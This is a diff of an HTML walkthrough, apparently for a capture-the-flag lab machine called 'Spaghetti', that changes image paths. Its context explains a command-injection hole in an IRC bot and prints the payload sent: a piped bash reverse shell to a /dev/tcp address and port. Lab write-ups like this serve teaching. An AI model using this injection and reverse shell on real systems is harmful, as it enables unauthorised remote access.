@@ -85,9 +85,9 @@ Service detection performed. Please report any incorrect results at https://nmap
 
     <li>The first real point of interest comes from the irc chat room.  I used the program hexchat to connect to the irc server.  There is a room on this irc server named #mailAssistant with a user/bot in it named spaghetti_BoT.  Once in the irc room you can send the message "hello" and the bot responds telling us to send it a DM with "!command"</li>
 
-    <img src="Spaghetti/irc_1.png">
+    <img src="../images/spaghetti/irc_1.png">
 
-    <img src="Spaghetti/irc_2.png">
+    <img src="../images/spaghetti/irc_2.png">
 
     <li>We have learned two things so far about the bot</li>
     <ul>
@@ -101,11 +101,11 @@ Service detection performed. Please report any incorrect results at https://nmap
             <ul>
                 <li>The description that we sends gets assigned to the variable "body"</li>
             </ul>
-            <img src="Spaghetti/code_body_variable.png">
+            <img src="../images/spaghetti/code_body_variable.png">
         </ul>
         <ul>
             <li>The code that sends the email.</li>
-        <img src="Spaghetti/irc_bot_code.png">
+        <img src="../images/spaghetti/irc_bot_code.png">
     </ul>
 
         <li>The user input does not go through any sanitization.  It gets passed directly into the "cmd" variable which then gets executed as a shell command.  In order to exploit this all we need to do is add a pipe before whatever command we want to send in the "description" portion of the command for email issues.</li>
@@ -114,7 +114,7 @@ Service detection performed. Please report any incorrect results at https://nmap
         <ul>
             <li>Sent: email:test@test.com description:| bash -c &#039;bash -i &gt;&amp; /dev/tcp/192.168.49.248/4444 0&gt;&amp;1&#039;</li>
         </ul>
-        <img src="Spaghetti/revshell.png">
+        <img src="../images/spaghetti/revshell.png">
 
         <li>The first thing upon getting a reverse shell is upgrading it to a pty, enabling the "clear" command, and enabling auto-compelete.</li>
 
